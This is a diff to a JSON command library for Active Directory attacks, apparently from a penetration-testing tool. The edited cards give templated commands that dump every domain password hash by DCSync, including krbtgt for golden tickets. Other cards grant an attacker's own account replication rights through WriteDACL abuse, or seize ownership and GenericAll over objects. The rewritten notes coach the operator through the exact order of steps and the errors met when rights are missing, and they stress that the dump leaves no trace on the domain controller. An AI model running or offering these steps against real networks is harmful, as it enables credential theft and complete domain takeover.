@@ -1055,7 +1055,7 @@
     {
      "tool": "impacket-secretsdump",
      "run": "impacket-secretsdump '{{domain}}/{{user}}:{{password}}'@{{target}}",
-     "note": "PREFERRED cash-in: a full DRSUAPI sync — every hash in the domain, krbtgt among them (golden ticket material). No interactive prompt, no DC-side artifact. Guard this file; it is the report evidence itself. It falls back to DRSUAPI automatically when the local SAM/LSA read is denied (a non-admin with only replication rights)."
+     "note": "PREFERRED cash-in: a full DRSUAPI sync — every hash in the domain, krbtgt among them (golden ticket material). No interactive prompt, no DC-side artifact. Guard this file; it is the report evidence itself. PREREQUISITE if you got here via ACL abuse (not a Domain Admin): your account must ALREADY hold the two replication ACEs. Run the ACL move's `add dcsync <you>` card FIRST and re-authenticate, then this. Getting rpc_s_access_denied or DRSR code 0x20f7 (ERROR_DS_DRA_BAD_DN) means those rights are not on your account yet — joining a WriteDACL group (e.g. Exchange Windows Permissions) only lets you GRANT them; it is not the grant itself."
     },
     {
      "tool": "impacket-secretsdump",
@@ -1757,23 +1757,24 @@
     },
     {
      "tool": "bloodyad",
-     "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' set owner \"{{target_sam}}\" {{user}}",
-     "note": "A WriteOwner edge: take ownership of the object..."
-    },
-    {
-     "tool": "bloodyad",
-     "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add genericAll \"{{target_sam}}\" {{user}}",
-     "note": "...then award yourself GenericAll. From there you can reset its password, targeted-Kerberoast it, or add shadow credentials."
-    },
-    {
-     "tool": "bloodyad",
+     "win": true,
      "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add dcsync {{user}}",
-     "note": "The cash-in: once WriteDACL on the domain object is yours (e.g. via Exchange Windows Permissions), grant your own account the DS-Replication rights (GetChanges + GetChangesAll) — then run the `dcsync` card. All from Linux: no PowerView upload, no dot-sourcing, no evil-winrm line-wrap breakage. Name any principal you control in place of {{user}}."
+     "note": "Run this next, right after you joined a group that holds WriteDACL over the domain (e.g. Exchange Windows Permissions). It writes the two DS-Replication ACEs (GetChanges + GetChangesAll) onto the domain object for your account — which lets you DCSync every hash in the domain and own it. RE-AUTHENTICATE first if you just joined the group, then run this, then the `dcsync` card (impacket-secretsdump) below. Skipping this is why secretsdump returns rpc_s_access_denied / DRSR ERROR_DS_DRA_BAD_DN — you must grant the rights before you can replicate. Name any principal you control in place of {{user}}."
     },
     {
      "tool": "impacket-dacledit",
      "run": "impacket-dacledit -action write -rights DCSync -principal {{user}} -target-dn '{{basedn}}' '{{domain}}/{{user}}:{{password}}'",
-     "note": "The Impacket equivalent of the DCSync grant when bloodyAD is unavailable: writes the two replication ACEs onto the domain root ({{basedn}}) for {{user}}."
+     "note": "The Impacket equivalent of the DCSync grant when bloodyAD is unavailable: writes the same two replication ACEs onto the domain root ({{basedn}}) for {{user}}. Then run the `dcsync` card (secretsdump)."
+    },
+    {
+     "tool": "bloodyad",
+     "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' set owner \"{{target_sam}}\" {{user}}",
+     "note": "A WriteOwner edge (a DIFFERENT primitive — not the DCSync path). Take ownership of a specific object when your lead is WriteOwner over it, then grant yourself control over that object below. Owning a group is not the same as replication rights — for DCSync use the `add dcsync` card above."
+    },
+    {
+     "tool": "bloodyad",
+     "run": "bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add genericAll \"{{target_sam}}\" {{user}}",
+     "note": "Award yourself GenericAll over an object you own or can write the DACL of. From there you can reset its password, targeted-Kerberoast it, or add shadow credentials — the route when the target is a USER/computer rather than a WriteDACL-over-domain group."
     },
     {
      "tool": "impacket-dacledit",
